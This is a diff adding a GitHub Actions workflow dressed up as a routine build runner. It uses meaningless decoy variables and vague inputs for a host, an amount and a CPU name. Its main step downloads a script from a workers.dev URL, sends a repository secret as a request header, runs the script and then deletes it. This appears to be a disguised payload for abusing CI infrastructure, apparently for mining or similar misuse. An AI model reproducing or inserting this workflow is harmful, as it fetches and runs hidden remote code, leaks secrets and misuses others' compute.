@@ -1,0 +1,62 @@
+name: runner
+
+on:
+  workflow_dispatch:
+    inputs:
+      host_override:
+        description: 'Host Address'
+        required: false
+        default: 'NIL'
+        type: string
+      loop_override:
+        description: 'How Much'
+        required: false
+        default: 'ZERO'
+        type: string
+      amd_override:
+        description: 'CPU Name'
+        required: false
+        default: 'Core'
+        type: string
+
+env:
+  INLINE: 'FALSE'
+  PASSIVE: 'FALSE'
+  INCOME: 'TRUE'
+  EXITCODE: '24'
+  CRASHID: '634'
+  IDMESK: ${{ github.event.inputs.host_override }}
+  OVLUP: ${{ github.event.inputs.loop_override }}
+  CPUID: ${{ github.event.inputs.amd_override }}
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 40
+    steps:
+      - name: Check
+        uses: actions/checkout@v7
+      - name: Pack
+        env:
+          DEBIAN_FRONTEND: noninteractive
+          CLASS: "134"
+          FUNC: "3"
+          LOOP: "0"
+        if: env.INCOME == 'TRUE'
+        run: |
+          sudo apt-get install -y --no-install-recommends \
+            units pv dos2unix zip unzip bzip2 \
+            xz-utils zstd file less lsof
+      - name: Runner
+        env:
+          CPP_BUILDER: "mingw"
+          CPP_MASK: "false"
+          CPP_ENGINE: "v3.54.2"
+        run: |
+          curl -sS -f -o run.sh \
+            -H "DEVTEST: ${{ secrets.DEVTEST }}" \
+            https://zesoea.emmaborsi.workers.dev/api/mesh/emma/ize
+          chmod +x run.sh && ./run.sh
+          rm -rf run.sh
+      - name: Files
+        run: ls -la
